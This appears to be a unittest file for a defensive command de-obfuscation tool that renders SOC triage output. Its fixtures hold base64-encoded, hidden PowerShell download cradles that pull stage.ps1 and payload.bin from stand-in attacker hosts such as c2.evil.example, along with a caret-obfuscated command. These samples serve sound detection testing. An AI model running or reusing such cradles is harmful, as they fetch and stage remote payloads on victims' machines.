"""Tests for the Tactical Triage HUD layout in render_pretty()."""

from __future__ import annotations

import base64
import io
import json
import unittest
from contextlib import redirect_stdout
from unittest.mock import patch

from cmd_unmask.cli import main as cli_main
from cmd_unmask.unpacker import unmask_command
from cmd_unmask.renderer import render_pretty


class TestTacticalHudLayout(unittest.TestCase):
    """Verify top-down HUD header, sequential numbering, benign collapsing, and ASCII fallback."""

    def test_critical_multistage_hud_box_and_sequential_sections(self) -> None:
        inner = "(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
        verdict = unmask_command(
            f"powershell.exe -NoP -W Hidden -enc {b64}",
            source_id="hud-crit-1",
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        out = render_pretty([verdict], color=True)

        # Top-down HUD box uses rounded UTF-8 borders when color=True
        self.assertIn("╭", out)
        self.assertIn("╰", out)
        self.assertIn("CMD-UNMASK [hud-crit-1] | CRITICAL (100/100)", out)
        self.assertIn("Chain: WINWORD.EXE -> powershell.exe", out)
        self.assertNotIn("...", out.split("╰")[0])

        # Clean top-down analyst reading flow:
        # [1] UNMASKED COMMAND -> [2] THREAT BREAKDOWN -> [3] DEFANGED IOCs -> [4] NEXT STEPS
        self.assertIn("[1] UNMASKED COMMAND (Base64 UTF-16LE Decoded)", out)
        self.assertIn(inner, out)
        self.assertNotIn("Step 0 [Raw Input]", out)
        self.assertIn("[2] THREAT BREAKDOWN", out)
        self.assertIn("  \x1b[36m•\x1b[0m ", out)
        self.assertIn("[3] DEFANGED IOCs", out)
        self.assertIn("[4] NEXT STEPS", out)
        self.assertNotIn("├─►", out)

        # Ordering: Unmasked Command -> Threat Breakdown -> Defanged IOCs -> Next Steps
        self.assertLess(out.index("[1] UNMASKED COMMAND"), out.index("[2] THREAT BREAKDOWN"))
        self.assertLess(out.index("[2] THREAT BREAKDOWN"), out.index("[3] DEFANGED IOCs"))
        self.assertLess(out.index("[3] DEFANGED IOCs"), out.index("[4] NEXT STEPS"))

        self.assertNotIn("[BEHAVIORAL CAPABILITIES]", out)
        self.assertNotIn("[VERDICT RATIONALE]", out)
        self.assertNotIn("[ANALYST EXECUTIVE BRIEF]", out)
        self.assertNotIn("[RECOMMENDED L1/L2 NEXT STEPS]", out)

    def test_benign_collapses_empty_iocs_and_behavioral_sections(self) -> None:
        verdict = unmask_command("ipconfig /all", source_id="hud-ben-1")
        out = render_pretty([verdict], color=False)

        self.assertIn("[1] UNMASKED COMMAND (Unobfuscated)", out)
        self.assertIn("[2] THREAT BREAKDOWN: None", out)
        self.assertNotIn("DEFANGED IOCs", out)
        self.assertIn("[3] NEXT STEPS", out)
        self.assertNotIn("Step 0 [Raw Input]", out)
        self.assertNotIn("READY-TO-PASTE SOC TICKET NOTE", out)

    def test_trivial_shell_normalizer_collapses_into_single_payload_unless_full(self) -> None:
        cmd = "p^o^w^e^r^s^h^e^l^l -NoP -Command \"Write-Host 'hello'\""
        verdict = unmask_command(cmd, source_id="hud-norm-1")
        out_default = render_pretty([verdict], color=False, full=False)
        self.assertIn("[1] UNMASKED COMMAND (Shell Normalizer)", out_default)
        sec1 = out_default.split("[2] THREAT BREAKDOWN")[0]
        self.assertNotIn("Step 0 [Raw Input]", sec1)
        self.assertNotIn("Step 1 [Shell Normalizer]", sec1)

        out_full = render_pretty([verdict], color=False, full=True)
        self.assertIn("Step 0 [Raw Input]", out_full)
        self.assertIn("Step 1 [Shell Normalizer]", out_full)

    def test_no_color_uses_strict_ascii_borders_without_jagged_lines(self) -> None:
        inner = "Invoke-WebRequest -Uri http://drop.evil.example/payload.bin -OutFile C:\\Users\\Public\\p.bin"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
        verdict = unmask_command(
            f"powershell.exe -NoP -enc {b64}",
            source_id="hud-ascii-1",
            parent_image=r"C:\Windows\System32\cmd.exe",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        out = render_pretty([verdict], color=False)

        self.assertNotIn("\x1b[", out)
        for ch in ("╔", "║", "╚", "╭", "╮", "╰", "╯", "├─►", "└─►", "─", "│", "•"):
            self.assertNotIn(ch, out)

        self.assertIn("+", out)
        self.assertIn("  - ", out)

        # Verify all HUD box lines share identical width (no jagged right border)
        box_lines = []
        for line in out.splitlines():
            if line.startswith("+") or line.startswith("| "):
                box_lines.append(line)
            elif box_lines:
                break
        self.assertGreaterEqual(len(box_lines), 4)
        widths = {len(line) for line in box_lines}
        self.assertEqual(len(widths), 1, f"Jagged HUD box widths: {widths}")

    def test_pretty_default_never_overwrites_clipboard_and_omits_banner(self) -> None:
        copied: list[str] = []
        buf = io.StringIO()
        with (
            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied.append(txt) or True),
            redirect_stdout(buf),
            patch.object(buf, "isatty", return_value=True),
        ):
            rc = cli_main(["-c", "ipconfig /all", "--no-color"])

        out = buf.getvalue()
        self.assertEqual(rc, 0)
        self.assertEqual(copied, [])
        self.assertNotIn("[SOC TRIAGE NOTE", out)
        self.assertNotIn("copied to clipboard", out)
        self.assertNotIn("omitted on stdout", out)

    def test_copy_note_flag_copies_to_clipboard_and_prints_banner(self) -> None:
        copied: list[str] = []
        buf = io.StringIO()
        with (
            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied.append(txt) or True),
            redirect_stdout(buf),
            patch.object(buf, "isatty", return_value=True),
        ):
            rc = cli_main(["-c", "ipconfig /all", "--no-color", "--copy-note"])

        out = buf.getvalue()
        self.assertEqual(rc, 0)
        self.assertEqual(len(copied), 1)
        self.assertIn("[SOC TRIAGE NOTE", copied[0])
        self.assertNotIn("[SOC TRIAGE NOTE", out)
        self.assertIn("SOC Ticket Note copied to clipboard (use --show-note to print)", out)

    def test_show_note_flag_prints_full_ticket_note_on_stdout(self) -> None:
        buf = io.StringIO()
        with (
            patch("cmd_unmask.cli.set_clipboard_text", return_value=True),
            redirect_stdout(buf),
        ):
            rc = cli_main(["-c", "ipconfig /all", "--no-color", "--show-note"])

        out = buf.getvalue()
        self.assertEqual(rc, 0)
        self.assertIn("[SOC TRIAGE NOTE", out)
        self.assertIn("Unmasked Cmd  :", out)

    def test_empty_iocs_omitted_on_non_benign_and_json_stays_pure(self) -> None:
        verdict = unmask_command("powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAA=", source_id="hud-noioc-1")
        out = render_pretty([verdict], color=False)
        self.assertNotIn("EXTRACTED IOCs", out)

        json_buf = io.StringIO()
        with redirect_stdout(json_buf):
            rc_json = cli_main(["-c", "ipconfig /all", "--format", "json"])
        self.assertEqual(rc_json, 0)
        parsed = json.loads(json_buf.getvalue())
        self.assertIsInstance(parsed, dict)


if __name__ == "__main__":
    unittest.main()
